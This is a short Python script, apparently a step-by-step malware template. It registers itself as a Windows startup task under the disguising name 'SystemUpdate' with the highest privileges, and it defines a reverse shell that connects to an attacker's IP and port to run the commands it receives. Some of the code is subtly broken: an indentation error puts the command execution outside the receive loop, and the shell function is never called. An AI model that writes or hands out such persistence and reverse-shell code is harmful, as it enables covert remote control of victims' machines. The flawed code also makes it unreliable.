import os
import subprocess
import socket

# Step 1: Define the script scope and functionality
# (You will follow the steps to complete this script.)

# Step 2: Add a function to create a scheduled task
def create_scheduled_task():
    task_name = "SystemUpdate"  # Task name to appear in Task Scheduler
    script_path = os.path.abspath(__file__)  # Get the full path of this script

    # Command to create the scheduled task
    command = f'schtasks /create /tn {task_name} /tr "python {script_path}" /sc onstart /rl highest /f'

    try:
        subprocess.run(command, shell=True, check=True)
        print(f"Scheduled task '{task_name}' created successfully.")
    except subprocess.CalledProcessError:
        print("Failed to create the scheduled task.")

# Step 3: Generate the reverse shell payload function
def reverse_shell():
    host = "192.168.1.100"  # Replace with attacker's IP
    port = 4444  # Replace with the port the attacker is listening on

    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, port))

        while True:
            command = s.recv(1024).decode("utf-8")
            if command.lower() == "exit":
                break
        output = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        s.send(output.stdout.read() + output.stderr.read())
        s.close()
    except Exception as e:
        print(f"Error: {e}")


# Step 4: Call the functions to create the scheduled task and launch the reverse shell
if __name__ == "__main__":
    create_scheduled_task()
    